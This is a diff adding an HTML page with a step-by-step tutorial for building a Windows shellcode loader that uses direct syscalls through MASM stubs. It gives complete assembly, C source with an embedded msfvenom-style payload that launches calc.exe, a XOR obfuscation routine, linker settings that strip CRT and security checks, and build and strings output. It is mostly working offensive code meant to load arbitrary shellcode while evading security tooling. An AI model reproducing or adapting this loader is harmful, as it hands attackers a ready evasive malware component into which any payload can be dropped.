@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- https://fsymbols.com/text-art/ -->
+    <title>text dump</title>
+</head>
+<body>
+<pre>
+
+███████████████████████████████████████████████████████
+█─▄▄▄▄█▄─█─▄█─▄▄▄▄█─▄▄▄─██▀▄─██▄─▄███▄─▄███▄─▄▄─█▄─▄▄▀█
+█▄▄▄▄─██▄─▄██▄▄▄▄─█─███▀██─▀─███─██▀██─██▀██─▄█▀██─██─█
+▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀▀
+
+## [0.0] Very very simple shellcode loader using MASM assembly 
+
+	1. Create a new Cpp project and create 3 files, syscall.asm and syscall.c, syscall.h
+	
+	The project needs to be configured.
+	Setup phnt header include directory for Solution->ProjectName.
+	
+	2. Win32 & CRT-less time :)
+	
+	- project properties linker->input->Ignore All default libraries  =   yes. 
+		link library dependencies = no
+		Additional Dependencies = add the private ntdllp ;ntdllp.lib or add #pragma comment(lib, "ntdllp.lib") 
+		if you have sdk & wdk
+		
+	- linker->Advanced->Entry Point                                   =   ThisIsNotAnEntryPoint (can be custom name)
+		linker-> all options -> Show Progress -> Display all progress messages 
+		Linker-> Debugging -> Generate Debug Info = No
+		
+	- c++->Code Generation->Basic Runtime Check                       =   default (to avoid linking in __RTC_*. 
+	- C/C++ -> all options -> security = Disable Security Check (/GS-)
+	- project properties MASM -> public symbols (Yes (/Zf)) (Can enable this or just specify PUBLIC FuncNameHere at top of asm
+		object file name -> $(SolutionDir)\Bin\%(FileName).obj
+		
+	- project properties MASM -> Advanced -> Calling conv = C-Style /Gd /Gd
+		error reporting = do not send
+	
+	
+	3. create syscall.asm (Get your syscall numbers and target to system)
+	#########################################################################################################################
+	
+	PUBLIC AlloeVirtMem
+	PUBLIC WriVirMem
+	PUBLIC ProtVirtMem
+	PUBLIC CreThreE
+	PUBLIC WaiSinObj
+	
+	_DATA SEGMENT
+	_DATA ENDS
+	
+	_TEXT SEGMENT
+	
+	AlloeVirtMem PROC
+		mov r10, rcx
+		mov eax, 18h
+		syscall
+		ret
+	AlloeVirtMem ENDP
+	
+	WriVirMem PROC
+		mov r10, rcx
+		mov eax, 3Ah
+		syscall
+		ret
+	WriVirMem ENDP
+	
+	ProtVirtMem PROC
+		mov r10, rcx
+		mov eax, 50h
+		syscall
+		ret
+	ProtVirtMem ENDP
+	
+	CreThreE PROC
+		mov r10, rcx
+		mov eax, 0C1h
+		syscall
+		ret
+	CreThreE ENDP
+	
+	
+	WaiSinObj PROC
+		mov r10, rcx
+		mov eax, 4h
+		syscall
+		ret
+	WaiSinObj ENDP
+	
+	
+	_TEXT ENDS
+	END
+
+	#########################################################################################################################
+	
+	
+	
+	
+	syscall.c
+	#########################################################################################################################
+	
+	/*
+	Micro Manual MASM based Self Thread Shellcode Injection Using Syscalls
+	Author	:	p4yl0ad/p.load
+	Date	:	29/10/2021
+	*/
+	
+	#include "syscall.h"
+	
+	void ThisIsNotAnEntryPoint(void)
+	{
+		DbgPrint("Custom Entrypoint ThisIsNotAnEntryPoint calc.exe no encryption\n");
+			
+		unsigned char pload[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };
+		size_t pload_size = sizeof(pload);
+		
+		HANDLE ph = NtCurrentProcess();
+		void * ba = NULL;
+		NTSTATUS SysAllocateReturn = AlloeVirtMem(ph, &ba, 0, &pload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		DbgPrint("SysAllocateReturn\t%x\n", SysAllocateReturn);
+	
+		my_memmove(ba, (void*)pload, 276);
+		DbgPrint("ba 0x%p", ba);      
+			
+		ULONG nprt = PAGE_EXECUTE_READ;
+		ULONG oprt = 0;
+		NTSTATUS SysNtProtectReturn = ProtVirtMem(ph, &ba, &pload_size, nprt, &oprt);
+		DbgPrint("SysNtProtectReturn\t%x\n", SysNtProtectReturn);
+		
+		HANDLE th = NULL;
+		NTSTATUS SysNtCreateReturn = CreThreE(&th, GENERIC_EXECUTE, NULL, ph, ba, NULL, FALSE, 0, 0, 0, NULL);
+		DbgPrint("SysNtCreateReturn\t%x\n", SysNtCreateReturn);
+		
+		WaiSinObj(th, FALSE, NULL);
+		DbgPrint("END");
+	}
+	
+	#########################################################################################################################
+	
+	
+	syscall.h
+	#########################################################################################################################
+	
+	#pragma once
+	#define WIN32_LEAN_AND_MEAN
+	#pragma check_stack(off)
+	
+	#include "phnt/phnt_windows.h"
+	#include "phnt/phnt.h"
+	
+	// this is taken straight from sektor7 RTO-MDE , nice lil xor routine
+	void XOR(char* data, size_t data_len, char* key, size_t key_len) {
+		int j;
+		j = 0;
+		// for the bytes in the data
+		for (int i = 0; i < data_len; i++)
+		{
+			// Iterate over every character in the key 
+			// and "encrypt" XOR a byte with that "key" character
+			if (j == key_len - 1) j = 0;
+			// xor the data at the iteration index with the key index e.g. data[1] ^ data[1] until key len is reached and will be repeated
+			data[i] = data[i] ^ key[j];
+			j++;
+		}
+	}
+	
+	#define BUFFER_SIZE        4096
+	
+	// taken straight from https://aticleworld.com/memmove-function-implementation-in-c/
+	void* my_memmove(void* dest, const void* src, unsigned int n)
+	{
+		char* pDest = (char*)dest;
+		const char* pSrc = (const char*)src;
+		////allocate memory for tmp array
+		//char* tmp = (char*)malloc(sizeof(char) * n);
+	
+		char* tmp[BUFFER_SIZE];
+	
+		if (NULL == tmp)
+		{
+			return NULL;
+		}
+		else
+		{
+			unsigned int i = 0;
+			// copy src to tmp array
+			for (i = 0; i < n; ++i)
+			{
+				*(tmp + i) = *(pSrc + i);
+			}
+			//copy tmp to dest
+			for (i = 0; i < n; ++i)
+			{
+				*(pDest + i) = *(tmp + i);
+			}
+	
+			//free(tmp); //free allocated memory
+			// not going to free lol
+		}
+		return dest;
+	}
+
+	
+	#########################################################################################################################
+	
+	
+	
+	
+	Now due to verbosity of the build, we can see what happens during the build. I dont really understand why some 
+	compiler flags clash but thats the MSVC compiler for you.
+	
+	
+	#########################################################################################################################
+	
+	Rebuild started...
+	1>------ Rebuild All started: Project: Syscall, Configuration: Release x64 ------
+	1>Assembling syscall.asm...
+	1>MASM : warning A4018: invalid command-line option : /Gd
+	1>cl : command line warning D9025: overriding '/sdl' with '/GS-'
+	1>syscall.c
+	1>Processed /NODEFAULTLIB (suppressing all default libs)
+	1>Starting pass 1
+	1>Searching libraries
+	[...SNIP...]
+	1>      Found __imp_DbgPrint
+	1>        Referenced in syscall.obj
+	1>        Loaded ntdllp.lib(ntdll.dll)
+	1>      Found __IMPORT_DESCRIPTOR_ntdll
+	1>        Referenced in ntdllp.lib(ntdll.dll)
+	1>        Loaded ntdllp.lib(ntdll.dll)
+	1>      Found __NULL_IMPORT_DESCRIPTOR
+	1>        Referenced in ntdllp.lib(ntdll.dll)
+	1>        Loaded ntdllp.lib(ntdll.dll)
+	1>      Found ntdll_NULL_THUNK_DATA
+	1>        Referenced in ntdllp.lib(ntdll.dll)
+	1>        Loaded ntdllp.lib(ntdll.dll)
+	1>Finished searching libraries
+	1>Finished pass 1
+	1>Generating code
+	1>Previous IPDB not found, fall back to full compilation.
+	1>All 2 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
+	1>Finished generating code
+	1>Searching libraries
+	[...SNIP...]
+	1>      Found __chkstk
+	1>        Referenced in syscall.obj
+	1>        Loaded ntdllp.lib(ntdll.dll)
+	1>Finished searching libraries
+	1>Invoking rc.exe:
+	1> /v
+	1> /x
+	1> /fo
+	1> "C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}.tmp"
+	1> "C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}.tmp"
+	1>Microsoft (R) Windows (R) Resource Compiler Version 10
+	1>
+	1>Copyright (C) Microsoft Corporation.  All rights reserved.
+	1>
+	1>
+	1>Using codepage 1252 as default
+	1>Creating C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}}.tmp
+	1>
+	1>
+	1>C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}.tmp.
+	1>Writing 24:1,	lang:0x409,	size 381
+	1>Invoking cvtres.exe:
+	1> /machine:amd64
+	1> /verbose
+	1> /out:"C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}.tmp"
+	1> /readonly
+	1> "C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}.tmp"
+	1>Microsoft (R) Windows Resource To Object Converter Version 14
+	1>Copyright (C) Microsoft Corporation.  All rights reserved.
+	1>
+	1>adding resource. type:MANIFEST, name:1, language:0x0409, flags:0x30, size:381
+	1>Unused libraries:
+	[...SNIP...]
+	1>Processing /ORDER options
+	1>    External code objects not listed in the /ORDER file:
+	1>        __chkstk		; ntdllp.lib(ntdll.dll)
+	1>        __imp_DbgPrint		; ntdllp.lib(ntdll.dll)
+	1>        DbgPrint		; ntdllp.lib(ntdll.dll)
+	1>        __imp___chkstk		; ntdllp.lib(ntdll.dll)
+	1>        ??_C@_0DG@NADDNNLH@Custom?5Entrypoint?5ThisIsNotAnEn@		; syscall.obj
+	1>Finished processing /ORDER options
+	1>    Discarded DbgPrint from ntdllp.lib(ntdll.dll)
+	1>Starting pass 2
+	1>     * CIL library *(* CIL module *)
+	1>     * linker generated manifest res *
+	1>     syscall.obj
+	1>     ntdllp.lib(ntdll.dll)
+	1>     ntdllp.lib(ntdll.dll)
+	1>     ntdllp.lib(ntdll.dll)
+	1>     ntdllp.lib(ntdll.dll)
+	1>     ntdllp.lib(ntdll.dll)
+	1>Finished pass 2
+	1>Syscall.vcxproj -> D:\Collections\Projects\Syscall\Syscall\x64\Release\Syscall.exe
+	1>Done building project "Syscall.vcxproj".
+	========== Rebuild All: 1 succeeded, 0 failed, 0 skipped ==========
+
+	#########################################################################################################################
+
+	Now you will have a tiny binary which doesnt depend on win32 or crt 	
+	If you can show me a way to load msfvenom shellcode in a smaller binary fair play and @ me on twitter PUNICODE_STRING
+	
+	
+	D:\Collections\Projects\Syscall\Syscall>ls -lah D:\Collections\Projects\Syscall\Syscall\x64\Release\Syscall.exe
+	-rwxr-xr-x 1 p4yl0_q36yakq 197610 4.0K Month 99 99:99 'DRVE:\Path\Syscall\x64\Release\Syscall.exe'
+
+
+	D:\Collections\Projects\Syscall\Syscall>D:\SysInternals\strings64.exe D:\Collections\Projects\Syscall\Syscall\x64\Release\Syscall.exe
+
+	Strings v2.54 - Search for ANSI and Unicode strings in binary images.
+	Copyright (C) 1999-2021 Mark Russinovich
+	Sysinternals - www.sysinternals.com
+	
+	!This program cannot be run in DOS mode.
+	axx
+	axx
+	axx
+	bxx
+	axy
+	`xx
+	`xx
+	`xx
+	`xx
+	`xx
+	Richaxx
+	u~b
+	.text
+	`.rdata
+	@.pdata
+	@.rsrc
+	@USH
+	D$(
+	D$`
+	D$d
+	D$h
+	AQH
+	D$lAPRQ
+	D$pVH1
+	D$teH
+	D$x`H
+	D$|
+	JJM1
+	<a|
+	, A
+	RAQH
+	B<H
+	@ I
+	@$I
+	AXA
+	X^YZ
+	AXAY
+	AZH
+	AR
+	E YZH
+	]HH
+	E<A
+	E@o
+	ET(<
+	E\u
+	roj
+	Elalc.
+	Epexe
+	D$
+	T$`
+	K H
+	D$ L
+	\$PH
+	\$HE3
+	\$@
+	\$8
+	\$0H
+	\$(H
+	D$ H
+	u~b
+	u~b
+	GCTL
+	.text$mn
+	.idata$5
+	.rdata
+	.rdata$voltmd
+	.rdata$zzzdbg
+	.xdata
+	.idata$2
+	.idata$3
+	.idata$4
+	.idata$6
+	.pdata
+	.rsrc$01
+	.rsrc$02
+	__chkstk
+	ntdll.dll
+	<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+	<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+	<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+		<security>
+		<requestedPrivileges>
+			<requestedExecutionLevel level='asInvoker' uiAccess='false' />
+		</requestedPrivileges>
+		</security>
+	</trustInfo>
+	</assembly>
+	
+
+
+	
+</pre>
+</body>
+</html>
